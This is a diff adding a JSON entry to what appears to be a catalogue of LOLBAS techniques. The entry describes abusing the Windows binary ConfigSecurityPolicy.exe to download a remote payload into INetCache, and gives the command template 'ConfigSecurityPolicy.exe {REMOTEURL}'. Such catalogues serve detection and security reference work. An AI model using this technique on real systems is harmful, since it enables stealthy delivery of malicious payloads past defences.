@@ -1,0 +1,23 @@
+{
+  "id": "lolbas-configsecuritypolicy-exe-download",
+  "name": "LOLBAS · ConfigSecurityPolicy.exe (Download)",
+  "command": "ConfigSecurityPolicy.exe {REMOTEURL}",
+  "description": "It will download a remote payload and place it in INetCache.",
+  "platform": "windows",
+  "tags": [
+    "lolbas",
+    "configsecuritypolicy",
+    "download"
+  ],
+  "source": "lolbas",
+  "source_url": "https://lolbas-project.github.io/lolbas/ConfigSecurityPolicy/",
+  "upstream_id": "ConfigSecurityPolicy.exe/Download/0",
+  "category": "lolbas",
+  "subcategory": "download",
+  "references": [
+    {
+      "title": "LOLBAS — ConfigSecurityPolicy.exe",
+      "url": "https://lolbas-project.github.io/lolbas/ConfigSecurityPolicy/"
+    }
+  ]
+}
